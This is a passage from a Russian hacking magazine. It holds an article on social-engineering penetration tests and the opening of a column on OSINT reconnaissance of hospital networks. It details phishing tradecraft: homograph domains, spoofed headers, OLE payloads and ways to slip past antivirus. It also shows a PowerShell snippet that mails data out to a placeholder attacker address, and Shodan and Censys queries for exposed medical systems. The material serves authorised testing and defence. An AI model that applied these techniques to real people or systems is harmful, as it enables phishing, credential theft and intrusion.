 • nanoscope —  утилита  трассировки  с  очень  низким  оверхедом
   (~20 наносекунд на один метод на Nexus 6);
 • icondialoglib — диалог, поз воляющий выб рать иконки, их цвет и другие
   параметры;
 • domic — реактивная система работы с DOM Android;
 • android‐ruler‐picker — рулетка для выбора нужных значений;
 • UCE‐Handler — библиотека, перехватывающая управление в момент
   падения приложения и выводящая информационное окно с возможностью
   просмотреть или отправить лог ошиб ки.





                      До и после UCE



                   ИНСТРУМЕНТЫ

 • dereﬂector — скрипт Frida для дерефлексии Java‐кода (превращения неп‐
   рямых вызовов методов в прямые);
 • Fantastic Malware and Where to Find Them — боль шой каталог списков все‐
   возможной малвари (в закладки!).
COVERSTORY

СОЦИАЛЬНАЯ
 ИНЖЕНЕРИЯ

        РАЗБИРАЕМ ПРАКТИКИ,
     МЕТОДЫ И ИНСТРУМЕНТЫ ДЛЯ
        СОЦИОТЕХНИЧЕСКОГО
           ТЕСТИРОВАНИЯ





                                        Ярослав Бабин
                                      Web Sec Warrior





Какой же пентест без социальной инженерии, верно? Соци‐
отехническое тестирование в наше вре мя стало совершенно
обычным делом, и мне не раз приходилось заниматься им
в рамках работ по анализу защищен ности. Я расскажу тебе
о техниках, которые идут в ход, и о разнообразных тонкостях,
которых в нашем деле — великое мно жество.


Я думаю, об актуальнос ти социальной инженерии говорить не приходится.
О действиях APT‐группировок и об эпидемиях рансомвари, распростра‐
няемой по почте, ты и так, ско рее всего, пос тоянно читаешь в новостях: Car‐
banak, Buhtrap, BlackOasis, GHOUL — за примерами таких атак далеко ходить
не нужно.


        WWW

                    •Новая операция кибершпионажа FinFisher: ата‐
                         ки MitM на уровне провайдера?
                       •Carbanak (Wikipedia)
                         •BlackOasis APT and new targeted attacks leverag‐
                             ing zero‐day exploit
                      •«Лаборатория Касперского» обнаружила кам‐
                      панию     кибершпионажа,     проведенную
                         с помощью готового вредоносного ПО
                        •Kaspersky exposes apparent Russian cyber‐espi‐
                        onage operation amid U.S. criticism



ЦЕЛИ ТЕСТИРОВАНИЯ
Когда договариваешься с заказчиком, первым делом нужно убедиться, что вы
оба верно представляете себе цели тес тирования. Заказчик обычно хочет:
 • подготовить или оценить работу центра реагирования на инциденты
   (CERT, SOC);
 • оценить осведомленность сот рудников;
 • корректно настроить спам‐филь тры, песочницы и антивиру сы.

В любом из этих случаев твоя задача будет заключаться в том, чтобы узнать,
как пользователи реагируют на фишин говые рассылки, но недопонимания
все равно случаются. Бывало, что пос ле нашей рас сылки заказчик просил
расследовать инцидент, забыв о том, что заказывал пентест. Или ИТ‐отдел
заказчика, видя аномалию почтового трафика, блокировал наши рассылки.
  Но что в таком случае про тес тировал заказчик? Группу реагирования?
Мониторинг? Точ но — не реакцию пользователей. Так что нужно обговари‐
вать подобные моменты и понимать, какие цели мы прес ледуем. В зависи‐
мости от них можно будет определить, как проводить дальнейшую рассылку.
  В итоге если заказчик хочет от нас, чтобы мы тес тировали именно поль‐
зователей, то письма можно слать всем им, договорившись, чтобы рассылки
не блокировали. Но если ста вится задача не толь ко проверить реакцию сот‐
рудников, но и протестировать спам‐фильтры, мы обычно выбираем неболь‐
шое количество пользователей, которые наименее осведомлены в вопросах
безопасности, например бухгалтерию, адми нистра тивный отдел или юрис‐
тов — в общем, всех, кто не свя зан с ИТ. И рассылаем только им: с задержкой
по времени и индивидуальным подходом к каждому.
   Также нужно помнить, что наши цели не те же самые, что у нас тоящих зло‐
умышленников. Для них главное — заразить рабочие станции пользователей
и развить атаку, попав во внут реннюю инфраструктуру организации, чтобы,
например, получить кон фиденциальную информа цию. Для нас же важно лишь
узнать, как сре агировал пользователь: открыл ли вложение, в какое время,
какие у него ОС и браузер — в общем, все, что может помочь заказ чику
устранить проблемы.
   Что роднит пентест с нас тоящей атакой — это обход всех воз можных
политик безопасности. Нам точно так же, как и зло умышленнику, нужно дос‐
тавить фишинговую ссылку или пейлоад до рабочей станции пользователя.


МОДЕЛЬ НАРУШИТЕЛЯ
Существует несколь ко моделей нарушителя, которые делятся на две части:
внутренний нарушитель и внешний. Внутренний либо обладает инсайдерской
информацией, либо даже находится внутри  сети. У внешнего име ется
минимальный набор знаний: название орга низации, отрасль и другая пуб‐
личная информация.
   Точно так же делятся и рас сылки. Если ты находишься в роли внешнего
нарушителя, то будешь, например, рас сылать пись ма от имени какой‐то сто‐
ронней организации с просьбой посмотреть выписку по счету, открыв вло‐
жение или перейдя по ссылке. Я, кстати, такие рас сылки не очень люблю
из‐за их низкой результативности. Что бы ее повысить, нужно как можно боль‐
ше внимания уделить раз ведке и по воз можнос ти найти максимум информа‐
ции о компании: адреса email сотрудников, географическое положение,
структура компании и другие подоб ные вещи.
   Если использовать модель внутреннего наруши теля, всю эту информацию
можно узнать у заказчика. Причем здесь уже мож но попросить и сами адреса
сотрудников для рассылки.


РАЗВЕДКА: ПАССИВНЫЙ СБОР
Утилит для  автоматизированного сбо ра информа ции просто огромное
количество — пример но по одной на каждого жителя Земли. :) Вот нес колько
наиболее  известных:   SpiderFoot,   intrigue   core,   DataSploit,  Maltego,
theHarvester. Но большинс тво из них дают крайне пос редственные результаты
при работе в русском сегменте.
  Для себя я выбрал несколько утилит, лишенных этого недостатка. Среди
них: SimplyEmail, ePochta Extractor и FOCA. По личному опыту могу сказать,
что SimplyEmail хорошо зарекомендовал себя в работе по СНГ и поиску
email‐адресов. FOCA же помогает структурировать и быстро анализировать
разные документы из поисковых систем и сай тов заказчика, искать адре са
и другую информацию.
  Кроме того, такую же раз ведку я делаю по всей инфраструктуре заказчика,
как при обычном пен тесте. Ана лизирую DNS, ищу поддомены, смотрю, какие
используются IP, и так далее. Большинс тво нужных для этого утилит перечис‐
лены на osintframework.com. Вот краткий список того, чем я чаще всего поль‐
зуюсь:
 • Whois History;
 • pentest‐tools.com, dnsdumpster.com;
 • dnsmap, knock.py, sublist3r, sublazerwlst.

Много результатов обычно дает и ана лиз соци аль ных сетей: ВК, «Одноклас‐
сники», Facebook, LinkedIn и прочие. Все они позволяют указать место
работы, по которому мы и будем искать. Для парсинга существуют разные
утилиты. Например, linkedin_proﬁles.py и corpint, также посмотри репозиторий
aleph data, там много утилит для анализа информа ции из социальных сетей.
  Не стоит упускать возможность порыскать и по Instagram и ВК, где дос‐
тупен поиск по геоло кации. Если ты точно зна ешь, где расположе на ком‐
пания, то можешь пос мотреть фотографии, которые делают сотрудники
на своем рабочем месте. Например, попада ются кадры с экранами монито‐
ров, а на них — внутренние номера и почтовые адре са, иконки программ.
Одно знание о версии Outlook может ока зать ся очень ценным (об этом —
ниже). Иногда я слышу истории о том, что сотрудни ки на стикерах пишут свои
пароли, но, честно, за всю свою практику я такого не встре чал.





Полезно бывает и ана лизировать лайки в «Фейсбу ке». Часто компании
во внутренних рассылках пишут что‐нибудь вроде «вот наша страница в Face‐
book, поставьте ей лайк и подпишитесь, пожалуй ста». Такой лайк может быть
косвенным признаком того, что человек работа ет в компании.
  Кроме этого, существуют отличные ресурсы вроде databases.today: mmn‐
t.ru, ftplike.com, metabot.ru, rapid‐search‐engine.com, alluc.ee и так далее. Там
можно найти слитые базы данных и искать адреса локально. Ну и конечно,
есть всем известный leakedsource.ru, где собира ются утекшие базы данных.
Правда, на нем всего три миллиарда учетных записей. Есть ресурс круче —
с пятью миллиардами, это weleakinfo.com. Там можно сде лать поиск по мас ке
и найти адреса с определен ного домена (то есть все адреса какой‐то кон‐
кретной компании), что чаще всего дает вну шитель ный результат.





Если у компании «странные» политики безопасности и принудительная смена
пароля вовсе отсутствует, то быва ет так, что модель внешнего нарушителя
становится внутренней (с разрешения заказчика, конечно), потому что пароль
учетной записи подходит и можно зайти в его почту и рассылать письма
с внутреннего адреса. Почти всегда результаты потрясающие.


РАЗВЕДКА: АКТИВНЫЙ СБОР
Кроме имейлов, полезно выяснять должности сотрудников и общую структуру
компании. Также я всегда ста раюсь собирать ФИО, нам это еще пригодится
на этапе составле ния внеш него вида пись ма. Ну и конечно, в ход пойдут раз‐
ные инструменты для перебо ра директорий — часто можно найти какие‐то
директории, куда сотрудники скидывают документы. Там в числе прочего
могут обнаружиться полезные метаданные или непубличная информация
о компании, оставлен ные временные фай лы. А еще, бывает, попадаются
фотографии, сделанные в офисе, и дру гие интерес ные вещи.





Один из инструментов, которые всегда под рукой, — это Google (см. статью
«Используем мало известные функции Google, чтобы найти сокрытое»). Также
тебе пригодятся  утилиты и сло вари для перебора директорий: DIRB,
dirsearch, fuzz.txt и так далее.
  В итоге все соб ранные и сгенерированные результаты по логинам email
придется перебирать на SMTP, например при помощи smtp‐user‐enum.pl.
По опыту могу сказать, что команды VRFY и EXPN почти всегда отключены,
работает только RCPT. Тут встречает ся глупая, но тем не менее распростра‐
ненная ошибка: люди берут базу из 1000 имен и 9000 фамилий и пытаются
брутить по ним. На это уходит невероятное количес тво вре мени и трафика.
Шанс, что админы заметят его и заб локиру ют, возрастает почти до 100%. Так
делать не нужно.
   Если ты уже установил, что в корпоративных адресах используется первая
буква имени, то бери топ букв для мужских и женских имен. Для мужчин это n,
i, p, e, k, m и так далее в порядке убывания рас пространенности, для жен‐
щин — a, e, m, d, y, o, n, t, v… 9000 фамилий тоже брать не нужно — достаточ‐
но нескольких сотен наибо лее популярных.
  Другая частая ошибка — пытать ся сгенерировать женские фамилии
из мужских, добавляя окончание ‐а. Это очень гру бый метод, который дает
много ошибок, — гораз до лучше будет использовать раздельные базы
фамилий.
   Также надо помнить, что, помимо SMTP, существу ет такая штука, как Lync
(сейчас она называется Skype for Business), и у нее свой API, на котором тоже
отлично можно валидировать учетные записи поль зователей (см. скрипт lync‐
smash.py).  Встречаются и  дру гие  внутренние  корпоративные  сервисы,
которые можно найти на поддоменах.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

       СОЦИАЛЬНАЯ
        ИНЖЕНЕРИЯ
                   РАЗБИРАЕМ ПРАКТИКИ, МЕТОДЫ
        И ИНСТРУМЕНТЫ ДЛЯ СОЦИОТЕХНИЧЕСКОГО
                               ТЕСТИРОВАНИЯ





ДОМЕН
В какой‐то момент тебе понадобится создать фишинговый домен — он быва‐
ет нужен как для рассылки, так и для соз дания фейкового сайта или портала
компании. Для этого есть утилита URLCrazy, но она не уме ет делать гомог‐
рафические домены (домены, в которых можно использовать Unicode), а вот
CATPHISH умеет. Помимо это го, в наборе утилит хорошо иметь dnstwist.





С регистрацией таких доменов, кстати, была проб лема: когда я пробовал
заменить символом Unicode только одну букву, все доменные регистраторы
отказывали мне и требова ли заменить на Unicode все символы. В наших
целях это часто проб лематично, потому что полностью совпадающих сим‐
волов не так много, а появления вся ких дефисов и точек в адресе хочется
избежать. Из тех регистраторов, с которыми я имел дело, единс твенный,
который разрешил менять один символ, — это GoDaddy.
   Также я проверил, как разные почтовые клиенты парсят punycode — реп‐
резентацию юникодных доменов в виде ASCII (ты наверняка встречал эти
сочетания типа xn‐‐). Так вот, выяснилось, что Outlook 2013, 2015 и 2016,
а также The Bat вместо них показывают Unicode, пряча от пользователя наш
небольшой трюк. В IBM Notes, Thunderbird, Mail из Windows 10 и macOS и Web
Outlook такое, к сожалению, не сра бота ет.





Как снизить вероятность того, что спам‐филь тры будут заворачивать рас‐
сылку? В первую оче редь надо грамотно нас троить Sender Policy Framework
(example.org. IN TXT "v=spf1 +a +mx +all"). Тогда почтовый сервер
сможет убедиться, что отправленное тобой пись мо действительно отправ‐
лено с того IP, который ука зан в DNS‐записи A или MX.
   Точно так же с DomainKeys Identiﬁed Mail. Попробую объяснить упрощенно:
грубо говоря, есть публичный и приватный клю чи, и, когда ты отправляешь
письмо со своего сервера, он подписывает твое письмо; одна запись будет
находиться на сервере DNS, другая — внутри пись ма. Во вре мя приема пись‐
ма сервер проверяет, схо дятся ли ключи, и если да, то повышает доверие
к письму. Также необ ходимо знать о записи PTR. Это обратная запись DNS:
она находится на сервере и говорит о том, что ресурс ссы лается на какое‐то
определенное доменное имя.


        WWW

                     Проверить, все ли верно настроено, и узнать рей‐
                         тинг доверия к письму позволяет сервис mail‐
                          tester.com.



ПРЕДВАРИТЕЛЬНАЯ РАССЫЛКА
Если заказчик с пониманием отно сится к тес тирова нию и разрешает нам сде‐
лать предварительную рассылку, мы выбираем десять‐пятнадцать поль‐
зователей и шлем им на почту письма, на которые с большой вероятностью
ответят. Не фишинг с акциями или призами, а какую‐нибудь просьбу, нап‐
ример: «Ваш коллега ска зал, что вы можете мне помочь и прислать внут‐
ренний номер другого сотрудника». В ответе обычно приходит что‐то вроде
«Нет, я не знаю, кто это такая…». Но это и не важно: важно просто получить
ответ. Кроме этого, можно попробовать отпра вить письмо на несуществу‐
ющий адрес: часто SMTP‐сервер присыла ет ответное письмо об отсутс твии
адресата.
   Что мы получаем таким образом? Самое главное — наличие или отсутс‐
твие корпоративной подписи и ее внешний вид. Кроме этого, мы узнаем,
как в компании выглядит заголовок From и как написаны имена и фамилии.
Например, фамилии могут быть на рус ском или транслитом, причем трансли‐
терация может выглядеть по‐разному: ю может писаться как ju, так и yu. Или,
например, ФИО может быть написано целиком. В общем, куча разных вари‐
антов, которые придется учесть на этапе рас сылки. Помимо этого, ты можешь
получить внутренний телефонный номер — он может пригодиться для соци‐
алки по телефону.
  Можно даже завязать беседу с сотрудни ком и в одном из сообщений
отправить ссылку на фишин говую стра ницу. По ссылке при этом может быть
просто 404. Нередко бывают случаи, когда поль зователь в ответ отправляет
тебе скрин, а на нем может быть видно, какой бра узер или почтовый клиент
используется.
  Заголов ки писем — тоже важ ный источник информации. Там наверняка
отметятся антивирусы и дру гие средства защиты — они любят это делать,
причем сообщают и версии, и дату пос леднего обновле ния баз. Ну и конечно,
из заголовков можно получить название почтовика и некоторые внутренние
адреса (что может дальше пригодиться для пентеста). Ни в коем слу чае
не проходи мимо такой воз можнос ти!





СОДЕРЖИМОЕ ПИСЬМА
Я очень не люблю социалку с письмами от начальства, а также про зарплаты,
увольнения и прочее в таком духе. Кого хоть раз увольняли через письмо?
А письма от начальства сейчас выглядят примерно так же правдоподобно,
как в 2005 году выглядели пись ма «Вы миллионный посетитель, вве дите дан‐
ные карты». В общем, скучно, глупо и неин терес но.
   Гораздо больше мне нравится придумы вать что‐нибудь пооригинальнее.
Например, трюк с недоставленными сообщениями, когда пользователю при‐
ходит уведомление об ошиб ке доставки пись ма, которое он не отправлял.
Обычно он думает: «Что за пись мо? Я не отправлял такое. Какое‐то вло‐
жение, ну‐ка, ну‐ка!»
  Привязка ко времени тоже чаще всего оказыва ется удачной иде ей. Любой
большой праздник вроде Нового года или Вось мого марта отлично годится.
Пишем: «Надо сдать деньги, вот список тех, кто не хочет сдавать, запиши
себя, если не хочешь» — и прикладываем документ Excel. Редко кто откажет‐
ся от соблазна глянуть на позорный список.
   Как вариант — можно изображать внутреннюю рас сылку: попросить
подойти в бухгалтерию, рас печатав и заполнив какие‐то бумажки, принести
какие‐то справки, которые предварительно необходимо открыть. В общем,
все, что приходит на почту каждый день и покажется пользователю обыден‐
ным, но при этом что обя зательно откроют, если в письме будет написано,
что это срочно.


ФИШИНГ
С фишингом все просто. Если мы изобража ем внутреннюю рассылку, то дос‐
таточно попросить перейти по ссылке на корпоративный портал, где для вхо‐
да потребуется ввести свой логин и пароль в обычную Basic‐аутентификацию.
Либо мы можем подделать оповещение от одно го из сервисов, исполь‐
зуемых в компании (Conﬂuence, Jira и так далее). Как раз тут нам и пригодится
брутфорс поддоменов, в ходе которо го ты выяснишь, что именно использует‐
ся. Не забудь прикрепить favicon.ico!


ОФОРМЛЕНИЕ
Оформление — одна из самых важ ных частей, от которой будет зависеть
успешность рассылки. Именно благодаря оформлению повышается доверие
пользователя к письму. Во‐первых, попытайся получить образец корпоратив‐
ной подписи: подделать ее будет особенно полезно, если она заметная —
например, с картинкой. Иногда она так хорошо привлекает внимание, что
люди даже не посмотрят на сторонний домен.
  Занятный факт: самое любимое сло во у каж дого человека — это его имя.
Если обращаться к сотруднику по имени, а еще лучше — с отчеством, то
это повысит шансы, что он откроет письмо и, возможно, вложение.
  Еще одна интересная вещь — это CC. Подредактировав заголовок пись‐
ма, в копию можно поставить вообще любых пользователей. При этом пись‐
мо не отправится им, но в клиенте будет отображать ся, что они есть в копии.
Туда можно внести любых сотрудников, и это тоже неплохо повышает уровень
доверия пользователя.


Ребята с Defcon Moscow недавно нашли баг в Outlook: заголовок From пар‐
сится неправильно, что дает воз можность ука зать фейковую почту вместо
реальной. Отображаться при этом будет именно фейковая, но письмо не счи‐
тается спамом и проходит все проверки. Если отправить письмо с заголов‐
ком From: Fake Mail <fake@mail.ru> <realemail@mail.ltd>, в некото‐
рых клиентах оно будет отображать ся как отправленное с fake@mail.ru.





Другой классный трюк, о котором стоит помнить, — это возможность исполь‐
зовать формат переписки. Делаем пись мо с ответом на другое письмо,
которого в реальности не было. Нап ример, как бы приводим цитату письма
от начальства, где сооб щается, что что‐то нужно срочно сде лать, и прик‐
ладываем документ. Внимание пользователя в таком случае гарантировано,
и, по моей статистике, шанс того, что он откро ет вло жение, тоже значительно
повышается.





В идеале ты дол жен соб люсти шрифты, цвет и про чие особенности письма
с уче том того, какой почтовик ты подделыва ешь. Например, в Outlook первое
письмо всегда пишется шрифтом Courier и первое сообщение — черным
цветом, а остальные уже синие. Это мелкая особенность, но достижение мак‐
симальной прав доподобности в данном случае очень важно.
   Ну и конечно, ты можешь захотеть скрыть адреса ссылок — например,
в HTML можно подставить в атрибут href одно, а в текст ссылки — совсем
другое. Но спам‐фильтр, увидев такое, может завернуть письмо. А вот From
письма стоит подделать так, что бы оно выглядело как у всех в фирме. Обя‐
зательно посмотри, что конкретно там ука зано, — имя и фамилия, или ФИО
целиком, или еще какой‐нибудь вариант.
  Не забывай и про Open Redirect. Его, на мой взгляд, вполне можно считать
уязвимостью. В социалке он работа ет очень хорошо: например, мы можем
использовать главный домен банка, а дальше в ссыл ке — Open Redirect,
который будет перекидывать на наш домен.





ПЕЙЛОАД
Конечно, ты можешь использовать Dynamic Data Exchange, который недавно
был очень популярен, но теперь его блокируют почти все антивирусы.
Можешь упаковывать в архив с паролем, что бы пользователь минут пять
пытался этот архив открыть. Можешь взять JS, MHT и MHTA, которые тоже
давно блокируются антивирусами, или RTF, где тоже недавно была найдена
уязвимость, которую потом экс плуатировали многие APT‐группировки.
  Но на дворе 2018 год, поэтому ничего из это го я не использую — только
если окажется, что что‐то вдруг из это го списка не блокиру ется. Я стараюсь
применять либо загрузку с внеш них ресурсов (в документ Word вставляется
объект с загрузкой по внешней ссылке, а в ответ мы можем получить GET‐
запрос и в некоторых случаях — NTLM‐хеш, если работать с Responder), либо
OLE: опять же вставляем такой объект в документ Word, лепим на него крутую
иконку (нап ример, еще одного документа Excel или архива) и получаем
в целом валидный документ, который требует от пользователя всего три кли‐
ка.





ПРОБЛЕМЫ
Один из частых вопросов, на которые нет четкого ответа, — это во сколько
отправлять сообщения, чтобы его сразу просмотрело как можно больше
людей. В девять утра или в полдень? Или перед самым окончанием рабоче го
дня?
  Иссле дователи здесь рас ходятся во мнении. Кто‐то рекомендует делать
рассылку сразу после обеда: когда пользователь сыт, его бдительность
может быть снижена. Некоторые говорят, что лучше пря мо до обеда, потому
что пик офисной активности — это 11–13 часов и сот рудник может быть нев‐
нимательным из‐за попыток делать нес колько дел одновре менно. Другой
вариант — слать письма в районе шести вечера, когда люди пытаются
как можно скорее закончить все дела, чтобы пой ти домой. Тут решать тебе.
  Другая частая проб лема — блокировка антивирусами, спам‐фильтрами
и другими средствами защиты. Письма могут просто не проходить песочницу.
Существуют разные методы обхо да песочниц, про честь о них ты можешь
в статье «Детект песочницы. Учимся определять, работает ли приложение
в sandbox‐изоляции». Но дело обычно сильно осложняется тем, что приходит‐
ся работать методом черного ящика и ты не зна ешь ничего о конфигурации.
  Еще один полезный интересный трюк исполь зует такую замечательную
особенность  Word,  как  восстановление  битых  документов.  Пос кольку
документ — это архив ZIP, его обычно можно открыть архи ватором. Но если
нарушить, например, целостность заголовка или пос ледовательность бай тов
внутри тела такого файла, то сделать это будет невоз можно. Таким образом,
файл проходит антивирус, но пос ле пары предуп режде ний откроется в Word.





И третья большая проб лема — получить результат, когда выходы в интернет
заблокированы. В компании могут быть вдруг закрыты и соединения по HTTP,
и даже DNS. Что делать, когда тра фик вооб ще не проходит? Плохим спо‐
собом решить эту проб лему может быть отправка рас сылки на личную почту
сотрудников. Заказчики обычно такого не допус кают, но исключения бывают.
  Но давай подумаем: если письмо все же получено, значит, какой‐то тра‐
фик все же проходит? Бинго! Работа ет почта, зна чит, можно использовать ее.
Доступ к тому же Outlook можно получить через COM‐объ ект и отправить
письмо самому себе с почты сотрудника таким кодом:


$Outlook = New‐Object ‐ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "attacker@email"
$Mail.Subject = "Subj"
$Mail.Body = "Message"
$Mail.Send()


ВЫВОДЫ
Что я чаще всего советую заказчикам? Набор обычно почти всегда одинаков:
мониторинг ано малий почтового трафика, настройка песочниц, спам‐филь‐
тров и других средств защиты, пос тоянное обучение сотрудников и (барабан‐
ная дробь) проведение социотехнического тестирова ния!
ВЗЛОМ


 РАЗВЕДКА
    НА ОСНОВЕ
    ОТКРЫТЫХ
   ИСТОЧНИКОВ




     КОЛОНКА ДЕНИСА МАКРУШИНА





В одной из прошлых колонок я рассказал
о  стадиях  целенаправленных  атак    (kill
chain). Первая стадия, ста дия «разведки»,
начинается задолго до того, как ата кующий
дотронется до первой машины жертвы.         Денис Макрушин                                                                                      Специализируется на
От количества и качества данных, соб‐         разработкеисследованиитехнологийугроз и
ранных на этом эта пе, зависит успешность       защиты#InspiredByInsecureот целевых атак.
атаки и, самое главное, стоимость ее про‐          condifesa@gmail.com
ведения.


Разумеется, можно стучать ся экс пло итами на уязвимые сервисы, дос тупные
на периметре (и, например, зас ветить сплоиты и свое присутс твие в логах
систем  защиты), а мож но использовать  spear  phishing и  закрепиться
на рабочей станции внутри периметра. Результат будет достигнут в обоих
случаях, но стоимость атаки совершенно раз ная.
   Стадия разведки — ключевая для выбора тактики, техник и тулз (tactics,
techniques and  procedures, далее  TTPs), которые будут использоваться
для достижения цели. Одна ко чаще всего задача разведки заключается
в следующем: найти как можно больше потенциаль ных точек входа для дос‐
тупа  к цели и оце нить сто имость реализации обнаруженных векторов.
Для того чтобы усложнить жизнь атакующему, который проводит разведку,
необходимо понимать, какие TTPs он использует на данном этапе.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ПОИСК НЕЗАКРЫТЫХ ДВЕРЕЙ
От множества точек входа в корпоративную сеть зависит множество векторов
атак, доступных зло умышленнику. Можно формаль но классифицировать точ‐
ки входа:
 • информационные системы, расположенные на периметре и имеющие
   доступ в интернет (серверы, рабочие станции, административные панели
   специального оборудования и так далее);
 • мобильные устрой ства, используемые сот рудниками внутри периметра
   и за его пределами;
 • учетные записи в облачных сервисах сотрудников (в том числе исполь‐
   зуемые в личных целях).

Последний пункт зачастую требует от ата кующего «инте рактива» с жертвой
(например, коммуникацию с объектом фишинговой атаки), что повышает риск
обнаружения атаки. Поэто му в некото рых случаях приори тет отдается экс плу‐
атабельным точкам входа, рас положенным на периметре.
  Сетевой периметр — понятие, которое с раз витием технологий и пов‐
семестным внедрением обла ков постепенно исчезает. Концепция Bring your
own device (BYOD), позволяющая сотрудникам компаний использовать лич‐
ные устройства для бизнес‐процессов, а также появление облаков (привет,
oﬃce365!) размывают периметр. Контролировать потоки данных между кор‐
поративной сетью и внешним миром становится невероятно трудно. И это же
облегчает жизнь злоумышленникам — мно гооб разие вариантов проник‐
новения растет.
  В больших организациях периметр пес трит сервисами, о которых забыли
(или не знают) админы и которые уже давно не патчились. Предлагаю поис‐
кать такие сервисы в тво ей орга низа ции. На примере любимых мною
медицинских организаций мы рассмотрим мно жество векторов проник‐
новения.  Впоследствии  ты  можешь  использовать  полученные  знания
для инвентаризации периметра принадлежащих тебе сетей.


Из редак цион ных раз говоров
 — Денис, давай разберем десять интерес ных сценариев проникновения
на реальных примерах из АРТ!
 — Я изучил тему, пораз бирал сценарии целевых атак и чес тно скажу, что
в них нет ничего, что меня вдохновило бы: почти все начинаются с этапа
«закинул фишинговое пись мо»... :)



ПРОСКАНИРОВАТЬ, ОТМЕТИТЬ, ПОВТОРИТЬ
Очевидно, для понимания того, что расположено на сетевом периметре,
необходимо получить диапа зон IP‐адресов, при надлежащий целевой орга‐
низации. В этом списке возможно наличие IP‐адресов третьих сторон (сер‐
вис‐провайдеры, подрядчики и прочие) — атакующий их точно включит
в скоп, а ты, как аудитор сво ей сети, этого делать не можешь. Полученный
диапазон IP можно занести в port‐сканер. Вместо Nmap я рекомендую
использовать для этой цели Masscan или ZMap — это сильно сок ратит вре‐
мя сканирования.
   Так, для оценки точек входа в медицин ские корпоративные сети можно
выгрузить из RIPE диапазоны IP‐адресов всех организаций, в названии
которых присутствуют ключевые слова:
 • healthcare;
 • medic;
 • clinic;
 • surgery;
 • hospit;
 • dental;
 • pharmacist.

После этого можно запус кать порт‐ска нер и подождать его выдачу несколько
дней.





              Фрагмент отчета о ска нировании Masscan

Если сканировать с помощью ZMap, то впоследствии можно воспользоваться
утилитой ZTag для расстановки тегов по каж дому обнаруженному сервису.
Теги проставляются на основе собранной базы баннеров. В случае со сканом
медучреждений полученные сервисы клас сифицируются следующим обра‐
зом.





        Топ сервисов на перимет ре медицин ской инфраструктуры

Среди тривиальных вещей вроде веб‐приложений и почтовых серверов
находятся интересные приложения: системы управления зданиями (building
management systems; кстати, у нас по этой теме написана целая серия статей,
вот  например),  принтеры   (зачас тую  без  какой‐либо  авторизации
к админ‐панелям), хранилища NAS (и даже специализированные PACS‐сер‐
веры), умные чайники и прочее. Исполь зуя каждый из найденных сервисов,
атакующий может определять векторы атаки и оценивать сложность (читай —
стоимость) их реализации.





  Пример информации об устройстве, использующем протокол Niagara
  Fox





  Панель управле ния принтером, в которой, например, виден список
  соседних беспроводных сетей





     Пример уязвимого медпортала, ведущего к медицинским данным


OSINT БЕЗ ИНТЕРАКТИВА
Другой известный способ получить информацию о периметре и при этом
никак с ним не взаимодействовать — изу чить логи Shodan и аналогичных
поисковых систем, роботы которых любез но все сделали за атакующего.
   Как было видно из логов выше, в публичном доступе находятся всевоз‐
можные серверы, которые могут нести в себе спе цифику деятельности
целевой организации и хранить ценную информа цию. К примеру, если
говорить о медицин ских компаниях, то их периметр содержит DICOM‐устрой‐
ства  и  PACS‐серверы   (picture  archiving  and  communication  system).
Это медицинские системы, основанные на стандарте DICOM (digital imaging
and communications in medicine, отраслевой стандарт соз дания, хранения,
передачи и визуализации медицинских изоб ражений и документов обсле‐
дованных пациентов) и состоящие из следующих компонентов:
 • DICOM‐клиент — медицин ское устройство, обла дающее возможностью
   передачи информации DICOM‐серверу;
 • DICOM‐сервер — программно‐аппаратный комплекс, который обес‐
   печивает получение и хра нение информации от клиентов (в частности,
   к таким устрой ствам относятся PACS‐серверы);
 • диагностическая  DICOM‐станция  и  DICOM‐принтеры —  програм‐
   мно‐аппаратный комплекс,  отвечающий  за обработку,  визуализацию
   и печать медицинских изоб ражений.

Отличительная  осо бенность  большинства  данных  систем —  наличие
веб‐интерфейса для управления ими через Сеть. Здесь могут обнаружиться
уязвимости, которые злоумышленник может использовать для получе ния дос‐
тупа к ценной информации и процес сам. Стоит подробнее рас смотреть эти
системы и проверить, дос тупны ли они из интернета, то есть служат ли потен‐
циальной точкой входа для злоумышленника.
  Поиск DICOM‐устрой ств можно начать с прос тейшего запроса в поис‐
ковике Shodan: DICOM port:104.





                    Список DICOM‐серверов

Также можно попробовать найти диаг ности чес кие DICOM‐станции — спе‐
циализированные PACS‐системы, которые используются для обработки,
диагностики и визуализации данных. Пример запроса для поисковой системы
Censys: pacs  and  autonomous_system.organization:  (hospital  or
clinic or medical or healthcare).





              Логин‐панели диаг ности чес ких станций

Используя стандартные зап росы в Shodan на получение информации о дос‐
тупных ресурсах на пор те 445 (SMB), ата кующий иногда может узнать имена
внутренних ресурсов (серверов и рабочих станций), благодаря которым
определить,  какие узлы  в  сети  в дальнейшем представляют  интерес,
а какие — нет.





  Информация о наименованиях ресурсов в локаль ной сети организации


СБОР ИНФОРМАЦИИ ДЛЯ СОЦИАЛЬНОЙ ИНЖЕНЕРИИ
Закрепиться  внутри  корпоративного  перимет ра  эффективно  позволяет
использование различных сценариев соци аль ной инженерии. Например,
рассылка фишин говых сооб щений, которые содержат вредоносные вложения
или ссылки, ведущие на фишинговые ресурсы.
  Для реализации данных сценариев ата кующий также должен собрать
информацию об объекте ата ки, чтобы увеличить вероятность, что адресат
перейдет по ссылке в пись ме или откро ет вложение. В нас тоящее вре мя
службы безопасности крупных орга низа ций ста раются повышать осведом‐
ленность своих сотрудников о вредонос ной корреспонденции, что явно
не идет на пользу злоумышленникам. Теперь злодеям необходимо не только
обойти спам‐фильтры жертвы и доставить «полез ную нагрузку» в Inbox, но и
мотивировать объект ата ки выполнить необ ходимые действия и, самое глав‐
ное, не вызвать подозрений.
  Обилие социальных сетей, а также «раскрепощенность» типичного их
пользователя пре доставляет атакующему воз можность извлечь информацию
о своей жертве и составить убедительный контекст «полезной нагрузки»:
текст сопроводительного пись ма, стиль коммуника ции.
   Это творческая задача, и зависит она от конкретной ситу ации, но в качес‐
тве обще го примера можно привести ресурс, который использует откры тые
API популярных соцсетей для извлечения ценной информации об учетной
записи.





    Пример веб‐сервиса OSINT, использующего API социальных сетей

К примеру, атакующий, обра тившись к LinkedIn, смог определить ключевых
сотрудников для организации атаки spear‐phishing, их име на, фамилии, кон‐
тактные данные (электронную почту). Используя эти данные, нес ложно найти
